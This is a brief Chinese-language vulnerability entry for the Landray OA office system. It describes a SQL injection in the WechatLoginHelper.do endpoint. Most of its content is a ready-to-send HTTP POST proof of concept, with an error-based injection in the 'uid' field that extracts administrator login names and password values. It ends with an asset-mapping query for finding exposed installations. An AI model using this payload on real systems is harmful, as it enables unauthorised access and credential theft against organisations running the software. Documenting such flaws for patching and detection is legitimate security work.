#### 影响范围

蓝凌OA

#### 漏洞概述

蓝凌OA WechatLoginHelper.do_SQL注入

#### 漏洞复现

漏洞POC：

```
POST /third/wechat/wechatLoginHelper.do HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36
Content-Length: 254
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

method=edit&openid=&nickname=&image=&uid=123'and updatexml(1,concat('~',(select concat('~',test.fdLoginName,'~',test.fdPassword,'~') from com.landray.kmss.sys.organization.model.SysOrgPerson test where test.fdLoginName like '%25admin12%25'),'~'),1)=1-- '
```

#### 资产测绘

```
app="Landray-OA系统"
```